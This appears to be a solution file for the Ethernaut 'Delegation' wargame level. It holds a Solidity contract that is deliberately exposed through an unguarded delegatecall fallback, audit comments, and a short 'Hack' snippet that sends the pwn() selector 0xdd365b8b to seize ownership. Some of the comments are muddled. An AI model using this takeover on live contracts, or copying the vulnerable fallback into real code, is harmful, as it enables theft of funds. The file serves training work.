// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner; // slot 0

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner; // slot 0
    Delegate delegate; // slot 1

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    /*
     * @Audit - The fallback function will call the delegate's pwn function
     * and change the owner of the delegate contract to msg.sender.
     * 
     * when sendTransaction called it triggers the fallback function which calls the delegate's pwn function
     * and change the owner (slot 0) of the delegate contract to msg.sender.
     * the way that it does delegatecall is calling pwn() and change slot 0 variable (owner) of the delegate contract 
     * which is the owner of the delegation contract also at slot 0. if slot 0 is other variable it will change that variable.
     * not owner at slot 1. 
     */
    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

// Hack :
// web3.eth.abi.encodeFunctionSignature(pwn());
// 0xdd365b8b
// contract.sendTransaction({data: "0xdd365b8b"})

/**
 * The goal of this level is for you to claim ownership of the instance you are given.
 *
 *   Things that might help
 *
 * Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used
 * to delegate operations to on-chain libraries, and what implications it has on execution scope.
 * Fallback methods
 * Method ids
 *
 *
 * Usage of delegatecall is particularly risky and has been used as an attack vector on multiple
 *  historic hacks. With it, your contract is practically saying "here, -other contract- or -other
 *  library-, do whatever you want with my state". Delegates have complete access to your
 *  contract's state. The delegatecall function is a powerful feature, but a dangerous one,
 * and must be used with extreme care.
 *
 * Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of
 *  how this idea was used to steal 30M USD.
 */
